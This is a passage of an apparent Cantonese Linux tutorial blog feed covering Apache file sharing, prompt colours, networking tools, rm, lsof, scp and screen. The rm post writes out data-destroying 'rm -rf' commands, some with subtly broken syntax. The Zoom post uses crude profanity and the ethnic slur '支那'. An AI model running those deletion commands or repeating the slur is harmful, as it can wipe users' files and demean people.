<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo systemctl reload apache2</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>

<h3 id="開啟-Browser"><a href="#開啟-Browser" class="headerlink" title="開啟 Browser"></a>開啟 Browser</h3><p>首先我地要知道你開左 Apache 既呢部機既 Private IP 係乜，<br>我地打 <code>ifconfig</code> 查下<br>然後 <code>inet</code> 隔離個 IP 就係你呢部機既 Private IP.<br>例如你見到既 IP 係 <code>192.168.0.205</code><br>我地將呢個 IP 打入去 Browser，<br>就會開到。</p>
<h3 id="檔案位置"><a href="#檔案位置" class="headerlink" title="檔案位置"></a>檔案位置</h3><p>Apache 既檔案係會擺喺 <code>/var/www/html</code><br>你只要擺入去就得，<br>就例如你想快速放檔案俾人，<br>但係又冇 USB，<br>又唔想用人地個啲 Online files Share web，<br>咁你只要係喺同一個 Network 底下就可以做到。</p>
<p>假設情況係想將 files 由 電腦A 送去 B 點，<br>假設檔案名係叫 <code>on99.exe</code>，<br>你只要將你呢個檔案 copy 去 <code>/var/www/html/</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp -r on99.exe /var/www/html/</span><br></pre></td></tr></table></figure>
<p>然後當你用部機上 (電腦A Private IP，假設 IP 係 192.168.0.205)<br>電腦B 我地用部機開 Browser 打</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.0.205/on99.exe</span><br></pre></td></tr></table></figure>

<p>咁你就成功 Access 到，然後再下載個檔案。</p>
<p>參考資料<br><a href="https://www.digitalocean.com/community/tutorials/how-to-install-the-apache-web-server-on-ubuntu-20-04">https://www.digitalocean.com/community/tutorials/how-to-install-the-apache-web-server-on-ubuntu-20-04</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>指令</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux - Terminal 密碼隱藏 Off/ON</title>
    <url>/2022/01/22/Linux-asterisks-password-in-terminal/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>打密碼既時候你唔想將字隱藏？</p>
<h1 id="開始"><a href="#開始" class="headerlink" title="開始"></a>開始</h1><p>改做 0pwfeedback.disabled 就係開返隱藏密碼<br>改做 0pwfeedback 就係開返顯示 *</p>
<p>隱藏 *</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo mv /etc/sudoers.d/0pwfeedback /etc/sudoers.d/0pwfeedback.disabled </span><br></pre></td></tr></table></figure>

<img src="/2022/01/22/Linux-asterisks-password-in-terminal/on.png" class="">

<p>開啟 *</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo mv /etc/sudoers.d/0pwfeedback.disabled /etc/sudoers.d/0pwfeedback </span><br></pre></td></tr></table></figure>

<img src="/2022/01/22/Linux-asterisks-password-in-terminal/off.png" class="">

<p>參考資料:<br><a href="https://forums.linuxmint.com/viewtopic.php?t=287824">https://forums.linuxmint.com/viewtopic.php?t=287824</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>指令</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux - 修改 Terminal linux@user Display 顏色</title>
    <url>/2022/01/28/Linux-change-terminal-user-color/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今篇文係講點樣改 Linux 既 Terminal 原本個 show user host 隻色 (Foreground).</p>
<h1 id="開始"><a href="#開始" class="headerlink" title="開始"></a>開始</h1><p>首先我地開你既 Terminal，<br>然後再打</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nano .bashrc</span><br></pre></td></tr></table></figure>

<p>然後我地鍵盤 撳 <code>Ctrl + w</code><br>查 <code>33</code>，<br>搵到呢段野.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$color_prompt</span>&quot;</span> = yes ]; <span class="keyword">then</span></span><br><span class="line">    PS1=<span class="string">&#x27;$&#123;debian_chroot:+($debian_chroot)&#125;\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ &#x27;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    PS1=<span class="string">&#x27;$&#123;debian_chroot:+($debian_chroot)&#125;\u@\h:\w\$ &#x27;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">unset</span> color_prompt force_color_prompt</span><br></pre></td></tr></table></figure>

<p>呢到呢個位我地用鍵盤既 上下左右箭嘴 控制而加既畫面，<br>同平時一樣咁用 Backspace del野，<br>我地將</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(<span class="variable">$debian_chroot</span>)&#125;\[\033[01;32m\</span><br></pre></td></tr></table></figure>

<p>入面既 <code>32m</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[\033[01;32m\</span><br></pre></td></tr></table></figure>

<p>改做 <code>31</code><br>PS : <code>31</code> 係代表紅色咁解</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[\033[01;31m\</span><br></pre></td></tr></table></figure>

<p>另外如果你唔想將佢變成紅色既話<br>可以打其他數字</p>
<ul>
<li>31 紅色</li>
<li>32 綠色</li>
<li>33 黃色</li>
</ul>
<p>睇返詳情可以喺呢個網睇<br><a href="https://misc.flogisoft.com/bash/tip_colors_and_formatting">https://misc.flogisoft.com/bash/tip_colors_and_formatting</a></p>
<p>我地完成哂之後就要 save</p>
<p>喺 用 nano editor 既情況下，<br>係同平時 gui 用 txt editor 係一樣既，<br>我地撳 <code>Ctrl + S</code> Save，<br>完成左之後再撳 <code>Ctrl + X</code> Exit</p>
<p>搞掂之後開一個新既 Terminal 就會發現改左隻色啦！</p>
<p>PS : Termnial 既 更改唔會係即時睇到改變，<br>你需要重新開過 Terminal 先會睇到效果，<br>又或者再行多次個 Program.</p>
<h2 id="完整影片示範"><a href="#完整影片示範" class="headerlink" title="完整影片示範"></a>完整影片示範</h2><img src="/2022/01/28/Linux-change-terminal-user-color/all.gif" class="">]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>修改</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux - 指令查 Pulic ip</title>
    <url>/2022/01/14/Linux-find-publicip-with-commands/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>有機部機喺冇 Gui 又或者唔想用 Browser 既情況下又想查下你而加既 Public ip 係乜既時候，你得返 Terminal俾你用，呢個時候就要學識點樣用指令查 Public ip.</p>
<h1 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl ifconfig.me</span><br><span class="line">curl -4/-6 icanhazip.com</span><br><span class="line">curl ipinfo.io/ip</span><br><span class="line">curl api.ipify.org</span><br><span class="line">curl checkip.dyndns.org</span><br><span class="line">dig +short myip.opendns.com @resolver1.opendns.com</span><br><span class="line">host myip.opendns.com resolver1.opendns.com</span><br><span class="line">curl ident.me</span><br><span class="line">curl bot.whatismyipaddress.com</span><br><span class="line">curl ipecho.net/plain</span><br></pre></td></tr></table></figure>

<p>參考資料:<br><a href="https://opensource.com/article/18/5/how-find-ip-address-linux">https://opensource.com/article/18/5/how-find-ip-address-linux</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>指令</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux gzip 壓縮檔案工具</title>
    <url>/2022/01/14/Linux-gzip-commands/</url>
    <content><![CDATA[<h1 id="gzip"><a href="#gzip" class="headerlink" title="gzip"></a>gzip</h1><p>要建立和提取 <code>gz</code> <code>tar</code> 檔案，可以使用工具 <code>gzip</code>。</p>
<h1 id="安裝-gzip"><a href="#安裝-gzip" class="headerlink" title="安裝 gzip"></a>安裝 gzip</h1><p>基本上大部分的套裝管理員都會有 <code>gzip</code>。<br>另外，有一些系統可能本身已經幫你安裝好，如果沒有，輸入以下指令安裝：</p>
<div class="note info flat">
    這邊是使用 <code>apt</code> 的安裝示範。
</div> 

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install gzip -y</span><br></pre></td></tr></table></figure>

<p><img src="install.png"></p>
<h1 id="壓縮檔案"><a href="#壓縮檔案" class="headerlink" title="壓縮檔案"></a>壓縮檔案</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gzip filename</span><br></pre></td></tr></table></figure>

<p><img src="gzip.png"></p>
<h1 id="解壓檔案"><a href="#解壓檔案" class="headerlink" title="解壓檔案"></a>解壓檔案</h1><p>下列是解壓檔案的例子</p>
<h2 id="解壓單一檔案"><a href="#解壓單一檔案" class="headerlink" title="解壓單一檔案"></a>解壓單一檔案</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gzip -d file1.gz</span><br></pre></td></tr></table></figure>

<p><img src="-d.png"></p>
<h2 id="解壓多個檔案"><a href="#解壓多個檔案" class="headerlink" title="解壓多個檔案"></a>解壓多個檔案</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gzip -d file1.gz file2.gz fil3.gz</span><br></pre></td></tr></table></figure>

<p>參考資料 :<br><a href="https://www.delftstack.com/zh-tw/howto/linux/how-to-use-gzip-command-in-linux/">https://www.delftstack.com/zh-tw/howto/linux/how-to-use-gzip-command-in-linux/</a><br><a href="https://project.zhps.tp.edu.tw/ethan/2009/09/compress/">https://project.zhps.tp.edu.tw/ethan/2009/09/compress/</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>指令</tag>
        <tag>壓縮</tag>
        <tag>Linux cli</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux - 熄機指令 | Halt</title>
    <url>/2022/02/02/Linux-halt-commands/</url>
    <content><![CDATA[<h1 id="Halt"><a href="#Halt" class="headerlink" title="Halt"></a>Halt</h1><p>shutdown 同 Halt 既分別係：</p>
<p>shutdown 係會好有系統咁將你所有服務，程式熄哂之後先再幫你熄機，而 poweroff 同 halt 係直接將你系統既電源切斷，強制關機。</p>
<div class="note info flat">
    除非你部機真係死左，如果唔係都建議你用 <code>shutdown</code> 黎熄機。
</div>

<h1 id="Halt-熄機"><a href="#Halt-熄機" class="headerlink" title="Halt 熄機"></a>Halt 熄機</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo halt -f</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo halt</span><br></pre></td></tr></table></figure>

<h1 id="Halt-重開機"><a href="#Halt-重開機" class="headerlink" title="Halt 重開機"></a>Halt 重開機</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo halt --reboot</span><br></pre></td></tr></table></figure>

<p>參考資料<br><a href="https://www.geeksforgeeks.org/halt-poweroff-and-reboot-commands-in-linux/">https://www.geeksforgeeks.org/halt-poweroff-and-reboot-commands-in-linux/</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>指令</tag>
        <tag>Linux cli</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux - ifconfig 指令</title>
    <url>/2021/12/11/Linux-ifconfig-Commands/</url>
    <content><![CDATA[<h2 id="ifconfig"><a href="#ifconfig" class="headerlink" title="ifconfig"></a>ifconfig</h2><p>ifconfig 用於顯示路由和網絡接口資訊，<br>如果輸入後沒有，<br>請輸入以下指令安裝。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install net-tools -y</span><br></pre></td></tr></table></figure>

<img src="/2021/12/11/Linux-ifconfig-Commands/net-tools.png" class="">

<h3 id="takedown-張卡"><a href="#takedown-張卡" class="headerlink" title="takedown 張卡"></a>takedown 張卡</h3><p>首先我地打 <code>ifconfig</code> 查下張卡叫咩名。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>

<img src="/2021/12/11/Linux-ifconfig-Commands/ifconfig.png" class="">


<p>將岩岩查到既名 copy 低 (紫色圈內)，<br>再打呢句指令 (要用 root 權限)。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ifconfig enp0s3 down</span><br></pre></td></tr></table></figure>

<img src="/2021/12/11/Linux-ifconfig-Commands/down.png" class="">

<h3 id="開返張卡"><a href="#開返張卡" class="headerlink" title="開返張卡"></a>開返張卡</h3><p>將岩岩查到既名 copy 低 (紫色圈內)，<br>再打呢句指令 (要用 root 權限)。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ifconfig enp0s3 up</span><br></pre></td></tr></table></figure>

<img src="/2021/12/11/Linux-ifconfig-Commands/up.png" class="">]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>指令</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux - 裝 zoom 同 del 撚左個濕鳩 zoom</title>
    <url>/2022/01/29/Linux-install-zoom-and-uninstall/</url>
    <content><![CDATA[<h1 id="DLLM-Zoom-上堂"><a href="#DLLM-Zoom-上堂" class="headerlink" title="DLLM Zoom 上堂"></a>DLLM Zoom 上堂</h1><p>你要返學但係又唔撚想用 zoom？<br>支那製又 send data 又 send 呢樣個樣去佢個 支那 Server，覺得好唔安全？</p>
<p>呢篇係為左唔洗下下上去 去佢個網 on99</p>
<h1 id="update-Package-manager"><a href="#update-Package-manager" class="headerlink" title="update Package manager"></a>update Package manager</h1><p>如果係新機就要 update 左 package manager 先：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -Sy</span><br></pre></td></tr></table></figure>

<h1 id="裝呢個爛鬼-zoom-Manjaro"><a href="#裝呢個爛鬼-zoom-Manjaro" class="headerlink" title="裝呢個爛鬼 zoom (Manjaro)"></a>裝呢個爛鬼 zoom (Manjaro)</h1><p>以下方法係直接下載 zoom，免開 browser，我地需要使用 <code>wget</code> 進行下載。</p>
<h2 id="下載-zoom-檔案-wget"><a href="#下載-zoom-檔案-wget" class="headerlink" title="下載 zoom 檔案 (wget)"></a>下載 zoom 檔案 (wget)</h2><p>開你既 Terminal 然後打呢抽野：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://cdn.zoom.us/prod/5.9.3.1911/zoom_x86_64.pkg.tar.xz</span><br></pre></td></tr></table></figure>


<h2 id="安裝-zoom-安裝檔-U"><a href="#安裝-zoom-安裝檔-U" class="headerlink" title="安裝 zoom 安裝檔 (-U)"></a>安裝 zoom 安裝檔 (<code>-U</code>)</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -U zoom_x86_64.pkg.tar.xz</span><br></pre></td></tr></table></figure>

<h1 id="你想del撚左佢就打"><a href="#你想del撚左佢就打" class="headerlink" title="你想del撚左佢就打"></a>你想del撚左佢就打</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -Rs zoom</span><br></pre></td></tr></table></figure>

<p>完。</p>
<p>屌你老母唔撚想用 zoom #_#</p>
]]></content>
      <categories>
        <category>Fuck this shit</category>
      </categories>
      <tags>
        <tag>指令</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux - ip 指令說明</title>
    <url>/2022/06/07/Linux-ip-Commands/</url>
    <content><![CDATA[<h1 id="ip"><a href="#ip" class="headerlink" title="ip"></a>ip</h1><p>ip 用於顯示路由和網絡接口資訊，如果輸入後沒有，請輸入以下指令安裝：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install net-tools -y</span><br></pre></td></tr></table></figure>




<h1 id="檢查-Gateway-IPV4-位置"><a href="#檢查-Gateway-IPV4-位置" class="headerlink" title="檢查 Gateway IPV4 位置"></a>檢查 Gateway IPV4 位置</h1><p>示範查看 Gateway IPV4</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip r</span><br></pre></td></tr></table></figure>

<img src="/2022/06/07/Linux-ip-Commands/ip%20r.png" class="">

<p>更多可以查看:<br><a href="https://mindmajix.com/linux-networking-commands-best-examples">https://mindmajix.com/linux-networking-commands-best-examples</a><br><a href="https://phoenixnap.com/kb/linux-ip-command-examples">https://phoenixnap.com/kb/linux-ip-command-examples</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>指令</tag>
        <tag>Linux cli</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux 顯示登入資訊 | Last</title>
    <url>/2022/02/02/Linux-last-commands/</url>
    <content><![CDATA[<h1 id="last"><a href="#last" class="headerlink" title="last"></a>last</h1><p>last 係一個用黎睇呢部機既最近操作時間，例如可以睇到以下既資料：</p>
<ul>
<li>幾時熄機</li>
<li>幾時重開機</li>
<li>幾時登入過</li>
</ul>
<p><img src="--help.png"></p>
<h1 id="熄機既時間"><a href="#熄機既時間" class="headerlink" title="熄機既時間"></a>熄機既時間</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">last -x shutdown</span><br></pre></td></tr></table></figure>

<p><img src="shutdown.png"></p>
<h1 id="重新開機既時間"><a href="#重新開機既時間" class="headerlink" title="重新開機既時間"></a>重新開機既時間</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">last -x reboot</span><br></pre></td></tr></table></figure>

<p><img src="reboot.png"></p>
<h1 id="最近五次既登入資料"><a href="#最近五次既登入資料" class="headerlink" title="最近五次既登入資料"></a>最近五次既登入資料</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">last -5</span><br></pre></td></tr></table></figure>

<img src="last -5.png"/>


<p>參考資料<br><a href="https://iter01.com/255176.html">https://iter01.com/255176.html</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>指令</tag>
        <tag>Linux cli</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux - route 指令說明</title>
    <url>/2022/06/07/Linux-route-Commands/</url>
    <content><![CDATA[<h1 id="route"><a href="#route" class="headerlink" title="route"></a>route</h1><p>route 用於顯示路由和網絡接口資訊，如果輸入後沒有，請輸入以下指令安裝。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install net-tools -y</span><br></pre></td></tr></table></figure>

<img src="/2022/06/07/Linux-route-Commands/net-tools.png" class="">

<h1 id="route-n"><a href="#route-n" class="headerlink" title="route -n"></a>route -n</h1><p>示範查看目前的 Gateway IPV4</p>
<ul>
<li>紅色圈內為 <code>名稱</code></li>
<li>淺藍色圈內為 <code>Gateway IPV4</code></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">route -n</span><br></pre></td></tr></table></figure>

<img src="/2022/06/07/Linux-route-Commands/route%20-n.png" class="">]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>指令</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux - rm 刪除檔案</title>
    <url>/2022/01/09/Linux-rm-commands/</url>
    <content><![CDATA[<h1 id="rm-remove"><a href="#rm-remove" class="headerlink" title="rm (remove)"></a>rm (remove)</h1><p>喺 Linux 系統，刪除檔案用既指令係 <code>rm</code>。</p>
<h1 id="刪除檔案"><a href="#刪除檔案" class="headerlink" title="刪除檔案"></a>刪除檔案</h1><p>這個指令會刪除檔案 <code>file.txt</code> (current path)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rm file.txt</span><br></pre></td></tr></table></figure>

<h2 id="刪除多個檔案"><a href="#刪除多個檔案" class="headerlink" title="刪除多個檔案"></a>刪除多個檔案</h2><p>這個指令會刪除檔案 <code>file.txt</code>, <code>file1.txt</code>, <code>file2.txt</code>, <code>file3.txt</code>, <code>file4.txt</code> (current path)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rm file1.txt file2.txt file3.txt file4.txt</span><br></pre></td></tr></table></figure>

<h1 id="刪除所有檔案"><a href="#刪除所有檔案" class="headerlink" title="刪除所有檔案"></a>刪除所有檔案</h1><p>刪除目前的 current path 內的所有檔案。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rm -rf *</span><br></pre></td></tr></table></figure>

<h1 id="除了指定的檔案其他刪除"><a href="#除了指定的檔案其他刪除" class="headerlink" title="除了指定的檔案其他刪除"></a>除了指定的檔案其他刪除</h1><p>除了 <code>file1.txt</code> 其他檔案都會刪除 (current path)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rm -rf!(file1.txt)</span><br></pre></td></tr></table></figure>

<h2 id="除了指定的檔案其他刪除-多個Files"><a href="#除了指定的檔案其他刪除-多個Files" class="headerlink" title="除了指定的檔案其他刪除 (多個Files)"></a>除了指定的檔案其他刪除 (多個Files)</h2><p>除了檔案 <code>file1.txt</code>, <code>file2.txt</code> 其他檔案都會刪除 (current path)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rm -rf!(file1.txt|file2.txt)</span><br></pre></td></tr></table></figure>

<p>參考資料 :<br><a href="https://codertw.com/%E7%A8%8B%E5%BC%8F%E8%AA%9E%E8%A8%80/631829/">https://codertw.com/%E7%A8%8B%E5%BC%8F%E8%AA%9E%E8%A8%80/631829/</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>指令</tag>
        <tag>Linux cli</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux 查程式網路連線 - lsof</title>
    <url>/2022/02/02/Linux-lsof-commands/</url>
    <content><![CDATA[<h1 id="lsof"><a href="#lsof" class="headerlink" title="lsof"></a>lsof</h1><p>lsof 意思是 <code>List Open Files</code>，用於找出哪些文件由哪個程式打開。</p>
<p><img src="--help.png"></p>
<h2 id="安裝-lsof"><a href="#安裝-lsof" class="headerlink" title="安裝 lsof"></a>安裝 lsof</h2><p>基本上大部分的套裝管理員都會有 <code>lsof</code>。<br>另外，有一些系統可能本身已經幫你安裝好，如果沒有，輸入以下指令安裝：</p>
<div class="note info flat">
    這邊是使用 <code>apt</code> 的安裝示範。
</div> 

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install lsof -y</span><br></pre></td></tr></table></figure>

<p><img src="-y.png"></p>
<h1 id="PID-尋找程式"><a href="#PID-尋找程式" class="headerlink" title="PID 尋找程式"></a>PID 尋找程式</h1><p>簡易：PID 是每個程式都會有的獨立數字，用來辨認程式 ~~</p>
<h2 id="根據-PID-列出程式"><a href="#根據-PID-列出程式" class="headerlink" title="根據 PID 列出程式"></a>根據 PID 列出程式</h2><p>列出 PID 是 <code>1629</code> 的程式。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">lsof -p 1629</span><br></pre></td></tr></table></figure>

<p><img src="-p.gif"></p>
<h2 id="根據-PID-列出程式-多個"><a href="#根據-PID-列出程式-多個" class="headerlink" title="根據 PID 列出程式 (多個)"></a>根據 PID 列出程式 (多個)</h2><p>列出 PID 是 <code>721</code>, <code>831</code>, <code>1001</code> 的程式。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">lsof -p 721,831,1001</span><br></pre></td></tr></table></figure>

<h2 id="指定-Port-80"><a href="#指定-Port-80" class="headerlink" title="指定 Port (80)"></a>指定 Port (80)</h2><p>尋找進程 Port 80 (HTTP) 有哪些程式使用。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">lsof -i :80</span><br></pre></td></tr></table></figure>

<p><img src="80p.gif"></p>
<h1 id="UDP-尋找程式"><a href="#UDP-尋找程式" class="headerlink" title="UDP 尋找程式"></a>UDP 尋找程式</h1><p>以下指令會使用 UDP Protocol 尋找。</p>
<h2 id="指定-UDP-連線"><a href="#指定-UDP-連線" class="headerlink" title="指定 UDP 連線"></a>指定 UDP 連線</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">lsof -i udp</span><br></pre></td></tr></table></figure>

<p><img src="udp.png"></p>
<h2 id="指定-udp-連線內的-1234-Port"><a href="#指定-udp-連線內的-1234-Port" class="headerlink" title="指定 udp 連線內的 1234 Port"></a>指定 udp 連線內的 1234 Port</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">lsof -i udp:1234</span><br></pre></td></tr></table></figure>

<h1 id="TCP-尋找程式"><a href="#TCP-尋找程式" class="headerlink" title="TCP 尋找程式"></a>TCP 尋找程式</h1><p>以下指令會使用 TCP Protocol 尋找。</p>
<h2 id="列出-TCP-LISTEN-狀態"><a href="#列出-TCP-LISTEN-狀態" class="headerlink" title="列出 TCP LISTEN 狀態"></a>列出 TCP LISTEN 狀態</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">lsof -i TCP -s TCP:LISTEN</span><br></pre></td></tr></table></figure>

<h2 id="列出已建立-TCP-網路連線"><a href="#列出已建立-TCP-網路連線" class="headerlink" title="列出已建立 TCP 網路連線"></a>列出已建立 TCP 網路連線</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">lsof -i TCP -s TCP:ESTABLISHED</span><br></pre></td></tr></table></figure>

<h2 id="指定-TCP-連線"><a href="#指定-TCP-連線" class="headerlink" title="指定 TCP 連線"></a>指定 TCP 連線</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">lsof -i tcp</span><br></pre></td></tr></table></figure>


<h1 id="所有網路連線"><a href="#所有網路連線" class="headerlink" title="所有網路連線"></a>所有網路連線</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">lsof -i</span><br></pre></td></tr></table></figure>

<p><img src="-i.gif"></p>
<h1 id="列出-69-626-網路連線"><a href="#列出-69-626-網路連線" class="headerlink" title="列出 69-626 網路連線"></a>列出 69-626 網路連線</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">lsof -i :69-626</span><br></pre></td></tr></table></figure>

<p>參考資料<br><a href="https://blog.gtwang.org/linux/linux-lsof-command-list-open-files-tutorial-examples/">https://blog.gtwang.org/linux/linux-lsof-command-list-open-files-tutorial-examples/</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>指令</tag>
        <tag>Linux cli</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux - SCP 加密連接伺服器工具</title>
    <url>/2022/01/27/Linux-scp-commands/</url>
    <content><![CDATA[<h1 id="SCP-Secure-Copy"><a href="#SCP-Secure-Copy" class="headerlink" title="SCP (Secure Copy)"></a>SCP (Secure Copy)</h1><p>呢個工具係用黎俾你喺兩部機之間安全咁複製文件同檔案。</p>
<p><img src="--help.png" alt="--help"></p>
<h1 id="SSH-Server-下載檔案去到你部電腦"><a href="#SSH-Server-下載檔案去到你部電腦" class="headerlink" title="SSH Server 下載檔案去到你部電腦"></a>SSH Server 下載檔案去到你部電腦</h1><p>將 SSH Server 上面嘅 /root/ 位置內所有檔案下載到你部機嘅 <code>.\OMGWTF\</code> 位置</p>
<div class="note info flat">
    說明：<code>.\</code> = current path in terminal
</div>

<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scp -r root@0.0.0.0:/root/* .\OMGWTF\</span><br></pre></td></tr></table></figure>

<h2 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scp -r username@ipa:/path/ YourLocalHost_Download_Path</span><br></pre></td></tr></table></figure>


<h1 id="由你部電腦上傳檔案去你部-SSH-Server"><a href="#由你部電腦上傳檔案去你部-SSH-Server" class="headerlink" title="由你部電腦上傳檔案去你部 SSH Server"></a>由你部電腦上傳檔案去你部 SSH Server</h1><p>upload 檔案 <code>fuckyou.exe</code> 去你部 ssh server 既 <code>/root/</code> 位置</p>
<h2 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scp fuckyou.exe root@0.0.0.0:/root/</span><br></pre></td></tr></table></figure>

<h2 id="格式-1"><a href="#格式-1" class="headerlink" title="格式"></a>格式</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scp file username@0.0.0.0:/path/</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>指令</tag>
        <tag>Linux cli</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux - Screen 同一個視窗下多程式運行</title>
    <url>/2021/12/16/Linux-screen/</url>
    <content><![CDATA[<h1 id="Screen"><a href="#Screen" class="headerlink" title="Screen"></a>Screen</h1><p>Screen 係用黎將一個 Terminal 當做好幾個 Windows 黎用既工具，同時都係可以喺連去 SSH Server 既時候俾你繼續喺背景繼續行而又唔洗熄既一個超實用工具，對住成日連去 SSH Server既人黎講真係一個恩物。</p>
<p>通常一個Terminal 只係可以開一個互動式（interactive）既 shell 黎用，而藉著 screen 既幫助，用家可以喺一個Terminal既情況下，同時用幾個互動式既 shell，除左自己個個 shell 之外，仲可以分開唔用既 session 俾其他人用，或者你用用下想quit左而加既 session 暫時卸離（detach），都可以做到，又可以入返去操作，真係好洗好用㗎 :p</p>
<h1 id="安裝"><a href="#安裝" class="headerlink" title="安裝"></a>安裝</h1><p>基本上大部分的套裝管理員都會有 <code>screen</code>。<br>另外，有一些系統可能本身已經幫你安裝好，如果沒有，輸入以下指令安裝：</p>
<div class="note info flat">
    這邊是使用 <code>apt</code> 的安裝示範。
</div> 

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install screen -y</span><br></pre></td></tr></table></figure>

<img src="install -y.png"/>

<h1 id="建立-Sessions"><a href="#建立-Sessions" class="headerlink" title="建立 Sessions"></a>建立 Sessions</h1><p>建立 Sessions 有兩種方法，包括係有命名同埋冇命名既方法。</p>
